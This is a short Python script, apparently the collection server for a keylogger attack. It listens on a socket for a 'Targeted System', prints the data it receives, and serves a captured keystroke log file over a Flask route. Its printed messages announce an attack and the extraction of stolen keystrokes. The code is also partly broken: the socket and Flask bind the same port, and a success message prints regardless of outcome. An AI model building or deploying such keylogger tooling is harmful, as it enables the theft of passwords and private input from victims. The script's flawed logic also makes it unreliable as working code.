from flask import Flask
import socket

app = Flask(__name__)

host = "127.0.0.1"
port = 5000

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind((host, port))
sock.listen()

print('Attack Initialization...')

conn, addr = sock.accept()

print("Connected with Targeted System!")

data  = conn.recv(1024).decode()
print(data)

print("...")

print("...")

@app.route('/')
def read_keystorkes():
    with open(r"C:\\keylog\\keylog.txt", "r") as f:
        keys = f.read()
        print(keys)
        
    return keys

print('Successfully extracted the Keystores.')

if __name__ == '__main__':
    app.run()